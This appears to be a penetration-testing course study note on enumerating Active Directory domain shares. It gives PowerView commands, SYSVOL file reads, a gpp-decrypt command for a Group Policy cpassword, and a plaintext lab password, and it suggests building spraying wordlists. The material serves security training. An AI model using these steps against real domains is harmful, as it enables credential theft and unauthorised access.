# 22.3.5 — Enumerating Domain Shares

- Module: PEN-200 · 22. Active Directory Introduction and Enumeration
- Source: portal.offsec.com · module `active-directory-introduction-and-enumeration-45847` (§22.3.5)
- Code blocks: 5

> Domain shares (esp. **SYSVOL** and custom shares) frequently leak policy files, scripts, and
> plaintext/decryptable credentials. Output omitted.

## Find shares with PowerView

```powershell
Find-DomainShare
```

```powershell
Find-DomainShare -CheckShareAccess   # only shares our current user can read
```

## Loot SYSVOL (readable by every domain user)

```powershell
ls \\{{DC_IP}}\sysvol\{{DOMAIN}}\
ls \\{{DC_IP}}\sysvol\{{DOMAIN}}\Policies\
cat \\{{DC_IP}}\sysvol\{{DOMAIN}}\Policies\oldpolicy\old-policy-backup.xml
```

> Old Group Policy Preferences (GPP) files hold a **`cpassword`** attribute — an AES-256 encrypted
> local-admin password. Microsoft published the AES key on MSDN, so it's trivially decryptable.

## Decrypt a GPP cpassword (Kali)

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

> Also hunt non-default shares (e.g. `docshare` on FILES04) — the lab hides a `start-email.txt`
> with a plaintext onboarding password (`HenchmanPutridBonbon11`). Catalog every credential and
> the emerging password pattern to seed spraying/brute-force wordlists. See
> [[../htbad/26-miscellaneous-misconfigurations]] for GPP/SYSVOL looting in the HTB notes.
